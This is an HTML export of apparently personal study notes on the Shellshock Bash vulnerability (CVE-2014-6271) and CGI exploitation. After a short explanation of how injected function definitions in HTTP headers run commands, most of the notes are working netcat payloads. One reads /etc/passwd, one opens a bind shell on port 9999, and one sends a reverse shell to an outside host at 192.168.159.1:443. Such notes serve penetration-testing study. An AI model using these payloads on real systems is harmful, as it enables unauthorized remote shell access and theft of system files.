<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Shell Shock</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Shell Shock</h1><br/><span style="text-decoration:underline;">General</span><br />• CVE-2014-6271<br />• Impacts BASH shell<br />• Find a CGI that uses Bash<br /><br /><span style="text-decoration:underline;">How CGI&#39;s Work</span> (Common Gateway Interface)<br />• CGI&#39;s commonly use Python or Perl<br />• When you call it, server starts process to run CGI<br />   ◇ Maybe that is a bash process to run CGI script<br />• Server passes info to CGI Script<br />   ◇ Uses envrionmental variables <br />   ◇ allows server to send headers to CGI<br />   ◇ e.g. http header “abc” is an EV called HTTP_ABC<br /><br /><span style="text-decoration:underline;">The Vulnerability</span><br />• Source of issue: Bash can have internal function declared in it&#39;s EV&#39;s<br />• run arbitrary commands after a function declaration<br />• declare EV is a function by adding <code>()</code> -&gt; add some injected commands to run<br /><br /><span style="text-decoration:underline;">Exploit</span><br />• netcat<br />• read arbitrary files:<br />   ◇ <code>echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc vulnerable 80</code><br />• Creating an empty function:<br />   ◇ <code>() { :;};</code><br /><br /><span style="text-decoration:underline;">Bind Shell</span><br />• use netcat to listen on a port and redirect input &amp; output to <code>/bin/sh</code><br />• <code>echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc vulnerable 80</code><br />   ◇ only works if netcat is installed<br />• if connection hangs, the CGI is waiting for you to connect using: <code>nc vulnerable 9999</code><br /><br /><span style="text-decoration:underline;">Reverse Shell</span><br />• bind a port on our system<br />• find a port that the server is likely to have access to<br />   ◇ 21 (FTP), 53 (DNS), 123 (NTP), 80 (HTTP), 443 (HTTPS)<br />• Try 443 (as root)<br />   ◇ <code>nc -l -p 443</code><br />• Payload<br />   ◇ <code>echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc vulnerable 80</code></div></body></html>